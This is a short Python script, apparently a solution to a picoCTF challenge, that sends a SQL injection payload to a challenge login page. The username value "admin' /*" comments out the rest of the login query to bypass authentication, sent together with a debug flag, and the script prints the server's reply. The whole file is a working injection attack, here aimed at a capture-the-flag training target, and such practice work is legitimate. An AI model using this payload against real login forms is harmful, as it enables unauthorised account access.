import requests

s = requests.Session()

exploit = {
    'username' : """admin' /*""",
    'password' : 'password',
    'debug' : '1'
}

resp = s.post("https://jupiter.challenges.picoctf.org/problem/53751/login.php", data=exploit)
print(resp.text)